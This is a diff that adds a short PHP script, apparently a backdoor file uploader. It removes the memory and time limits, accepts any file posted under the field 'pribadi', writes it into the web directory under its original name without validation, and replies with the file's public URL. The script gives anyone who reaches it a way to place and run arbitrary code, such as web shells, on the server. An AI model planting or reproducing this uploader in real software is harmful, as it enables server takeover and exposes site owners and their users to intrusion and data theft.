@@ -1,0 +1,16 @@
+<?php
+
+@ini_set("memory_limit", "-1");
+@ini_set('max_execution_time', 0);
+
+header("Content-Type: text/plain");
+$actual_link = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]/";
+$link = str_replace($_SERVER['SCRIPT_NAME'], "", $actual_link);
+if (isset($_FILES['pribadi'])) {
+	if (move_uploaded_file($_FILES['pribadi']['tmp_name'], $_FILES['pribadi']['name']) !== false) {
+		echo json_encode(array("status" => "success", "file" => $link.$_FILES['pribadi']['name']));
+	} else {
+		echo json_encode(array("status" => "failed", "file" => false));
+	}
+}
+?>
